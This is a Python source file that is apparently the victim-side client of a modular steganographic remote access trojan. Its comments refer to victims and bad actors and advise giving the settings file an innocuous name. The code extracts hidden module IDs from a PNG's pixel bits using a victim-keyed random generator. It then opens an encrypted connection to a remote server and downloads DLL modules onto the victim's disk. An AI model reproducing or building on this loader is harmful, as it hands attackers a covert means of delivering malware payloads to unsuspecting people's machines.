import os
import json
import hmac
import base64
import socket
import hashlib
from PIL import Image
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric.ec import EllipticCurvePublicKey, EllipticCurvePrivateKey

"""
- The following variables are dependent on the victim
- These should be set for the bad actor using them
- For testing they are loaded in from a JSON file - this is also a valid option
- If this is forked for use, the JSON file name should be updated to smth more innocuous
"""
JSON_NAME = "VictimSettings.JSON"

#Setup variables
NO_BYTES_PER_MODULE = 2
DB_INIT_SIZE_BYTES = 1024

databaseHost = ""
databasePort = 0

class HMAC_DRBG:
    def __init__(self, seed: bytes):
        self.K = b"\x00" * 32
        self.V = b"\x01" * 32
        self._update(seed)

    def _hmac(self, key, data):
        return hmac.new(key, data, hashlib.sha256).digest()

    def _update(self, seed=b""):
        self.K = self._hmac(self.K, self.V + b"\x00" + seed)
        self.V = self._hmac(self.K, self.V)
        if seed:
            self.K = self._hmac(self.K, self.V + b"\x01" + seed)
            self.V = self._hmac(self.K, self.V)

    def randbytes(self, n):
        output = b""
        while len(output) < n:
            self.V = self._hmac(self.K, self.V)
            output += self.V
        self._update()
        return output[:n]

    def randint(self, maxExclusive):
        raw = self.randbytes(4)
        return int.from_bytes(raw, "big") % maxExclusive

def LoadSettingsFromJSON(jsonName : str) -> tuple[str, tuple[str, int]]:
    jsonPath = os.path.join(os.getcwd(), jsonName)
    with open(jsonPath, "r") as f:
        jsonDict = json.load(f)
    
    victimBytesHex = jsonDict["Hex"]
    serverAddress = jsonDict["Address"]
    portAddress = int(jsonDict["Port"])
    
    return (victimBytesHex, (serverAddress, portAddress))

def InitServerConnection() -> tuple[AESGCM, socket.socket]:
    dbSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    dbSocket.connect((databaseHost, databasePort))

    #Deriving an AES key using ECDHE
    alicePrivate = ec.generate_private_key(ec.SECP256R1())
    alicePublic = alicePrivate.public_key()

    #Sending alice public to bob the database
    alicePublicBytes = alicePublic.public_bytes(
        encoding=serialization.Encoding.X962,
        format=serialization.PublicFormat.UncompressedPoint
    )

    aliceTransmission = json.dumps({"Alice Public" : base64.b64encode(alicePublicBytes).decode()})

    dbSocket.send(aliceTransmission.encode().ljust(1024, b"\0"))
    bobTransmission = json.loads(dbSocket.recv(1024).rstrip(b"\0").decode())
    bobPublicBytes = base64.b64decode(bobTransmission["Bob Public"])
    bobPublic = ec.EllipticCurvePublicKey.from_encoded_point(
        ec.SECP256R1(),
        bobPublicBytes
    )

    aliceSharedSecret = alicePrivate.exchange(
        ec.ECDH(),
        bobPublic
    )

    AESKey = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b"Client-DB-Handshake",
    ).derive(aliceSharedSecret)

    aes = AESGCM(AESKey)
    
    return (aes, dbSocket)

def IncrementNonce(oldNonce : bytes, increment : int) -> bytes:
    oldNonceInt = int.from_bytes(oldNonce, byteorder="big")
    oldNonceInt = (oldNonceInt + increment) % (1 << 96) #Wraparound
    nonce = oldNonceInt.to_bytes(12, byteorder="big")
    return nonce

def ExtractFromStego(stegoPath : str):
    stego = Image.open(stegoPath).convert("RGB")
    sizeX, sizeY = stego.size
    availablePixels = [(i,j) for i in range(sizeX) for j in range(sizeY)]
    
    #Step 1 - load the stegoBytesHex seed for the DRBG
    stegoBytesHexStrListForm = []
    
    for i in range(128):
        stegoBytesHexStrListForm.append(
            str(
                stego.getpixel((i,0))[0] % 2
            )
        )
        availablePixels.remove((i,0))
        
    stegoBytesHex = int("".join(stegoBytesHexStrListForm) ,2).to_bytes(16, "big")
    drbgSeed = bytes.fromhex(victimBytesHex) + stegoBytesHex
    drbg = HMAC_DRBG(drbgSeed)
    
    #Step 2 - read the ciphertext
    message = []
    
    extracting = True
    while(extracting):
        pixelPosition = availablePixels[drbg.randint(len(availablePixels))]
        availablePixels.remove(pixelPosition)  
        channel = drbg.randint(3)
        
        message.append(
            str(
                stego.getpixel(pixelPosition)[channel] % 2
            )
        )
        
        if((len(message) % (8 * NO_BYTES_PER_MODULE) == 0) and (message[-NO_BYTES_PER_MODULE * 8:] == ["0"] * (NO_BYTES_PER_MODULE * 8))):
            extracting = False

    #Step 3 - turn the message into a list of modules
    moduleInfo = message[:-(8 * NO_BYTES_PER_MODULE)]
    modules = []
    moduleSettings = []
    
    #print(f"Module Info : {moduleInfo} || {len(moduleInfo)}")
    
    moduleFullSets = [moduleInfo[i : i + 512] for i in range(0, len(moduleInfo), 512)]

    for moduleSet in moduleFullSets:
        moduleRawData = moduleSet[:8 * NO_BYTES_PER_MODULE]
        moduleSettingRawData = moduleSet[8 * NO_BYTES_PER_MODULE:]
      
        moduleStr = "".join(moduleRawData)
        module = int(moduleStr, 2)
        modules.append(module)
      
        moduleSetting = [int("".join(moduleSettingRawData[i:i+8]), 2) for i in range(0, 62 * 8, 8)]
        moduleSettings.append(moduleSetting)
        #print(len(moduleRawData), moduleRawData)
        #print(len(moduleSettingsRawData))
    
    print(modules)
    print(moduleSettings)
    
    #Step 4 - get the module DLLs from the server
    aes, dbSocket = InitServerConnection()
    seedNonce = os.urandom(12)
    
    transmissionRaw = {
        "Nonce" : base64.b64encode(seedNonce).decode(),
        "Type" : base64.b64encode(aes.encrypt(seedNonce, "VICTIM_REQUEST_MODULES".encode(), None)).decode(),
        "Modules" : base64.b64encode(aes.encrypt(IncrementNonce(seedNonce, 1), json.dumps(modules).encode(), None)).decode()
    }
    
    transmission = json.dumps(transmissionRaw).encode().ljust(DB_INIT_SIZE_BYTES, b"\0")
    dbSocket.send(transmission)
    response = dict(json.loads(aes.decrypt(IncrementNonce(seedNonce, 2), dbSocket.recv(2048).rstrip(b"\0"), None).decode()))
    
    #Receiving the modules
    clientPath = os.path.join(os.getcwd(), "Client Modules")
    os.makedirs(clientPath, exist_ok=True)
    
    increment = 3
    for module in response:
        size = response[module]
        amountToRecv = size
        #print(amountToRecv)
        with open(os.path.join(clientPath, str(module) + ".dll"), "wb") as f:
            while amountToRecv > 0:
                
                #print(min(amountToRecv, 65536) + 16)
                #print(int.from_bytes(seedNonce))
            
                chunk = aes.decrypt(IncrementNonce(seedNonce, increment), dbSocket.recv(min(amountToRecv, 65536) + 16), None)
                f.write(chunk)
                amountToRecv -= len(chunk)
                increment += 1
    
    dbSocket.shutdown(socket.SHUT_RDWR)
    dbSocket.close()

#Loading in the JSON stuff
victimBytesHex, (databaseHost, databasePort) = LoadSettingsFromJSON(JSON_NAME)
ExtractFromStego(r"C:\Users\iniga\OneDrive\Programming\ModularStegoRAT\Stegos\1Stego.png")